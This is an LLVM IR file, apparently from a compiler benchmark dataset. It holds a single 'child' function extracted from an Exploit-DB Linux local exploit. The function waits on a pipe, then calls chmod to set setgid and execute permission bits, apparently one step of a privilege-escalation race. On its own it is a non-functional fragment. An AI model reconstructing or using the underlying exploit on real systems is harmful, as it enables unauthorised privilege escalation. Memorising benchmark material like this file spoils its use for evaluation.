; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_33824.c_child.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_33824.c_child.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.args = type { i32, i32* }

@S_ISGID = common dso_local global i32 0, align 4
@S_IRUSR = common dso_local global i32 0, align 4
@S_IWUSR = common dso_local global i32 0, align 4
@S_IRGRP = common dso_local global i32 0, align 4
@S_IXGRP = common dso_local global i32 0, align 4
@S_IXUSR = common dso_local global i32 0, align 4
@llvm.used = appending global [1 x i8*] [i8* bitcast (i32 (i8*)* @child to i8*)], section "llvm.metadata"

; Function Attrs: noinline nounwind optnone uwtable
define internal i32 @child(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca %struct.args*, align 8
  %4 = alloca i8, align 1
  store i8* %0, i8** %2, align 8
  %5 = load i8*, i8** %2, align 8
  %6 = bitcast i8* %5 to %struct.args*
  store %struct.args* %6, %struct.args** %3, align 8
  %7 = load %struct.args*, %struct.args** %3, align 8
  %8 = getelementptr inbounds %struct.args, %struct.args* %7, i32 0, i32 1
  %9 = load i32*, i32** %8, align 8
  %10 = getelementptr inbounds i32, i32* %9, i64 1
  %11 = load i32, i32* %10, align 4
  %12 = call i32 @close(i32 %11)
  %13 = load %struct.args*, %struct.args** %3, align 8
  %14 = getelementptr inbounds %struct.args, %struct.args* %13, i32 0, i32 1
  %15 = load i32*, i32** %14, align 8
  %16 = getelementptr inbounds i32, i32* %15, i64 0
  %17 = load i32, i32* %16, align 4
  %18 = call i64 @read(i32 %17, i8* %4, i32 1)
  %19 = icmp eq i64 %18, 0
  %20 = zext i1 %19 to i32
  %21 = call i32 @assert(i32 %20)
  %22 = load %struct.args*, %struct.args** %3, align 8
  %23 = getelementptr inbounds %struct.args, %struct.args* %22, i32 0, i32 0
  %24 = load i32, i32* %23, align 8
  %25 = load i32, i32* @S_ISGID, align 4
  %26 = load i32, i32* @S_IRUSR, align 4
  %27 = or i32 %25, %26
  %28 = load i32, i32* @S_IWUSR, align 4
  %29 = or i32 %27, %28
  %30 = load i32, i32* @S_IRGRP, align 4
  %31 = or i32 %29, %30
  %32 = load i32, i32* @S_IXGRP, align 4
  %33 = or i32 %31, %32
  %34 = load i32, i32* @S_IXUSR, align 4
  %35 = or i32 %33, %34
  %36 = call i32 @chmod(i32 %24, i32 %35)
  ret i32 0
}

declare dso_local i32 @close(i32) #1

declare dso_local i32 @assert(i32) #1

declare dso_local i64 @read(i32, i8*, i32) #1

declare dso_local i32 @chmod(i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
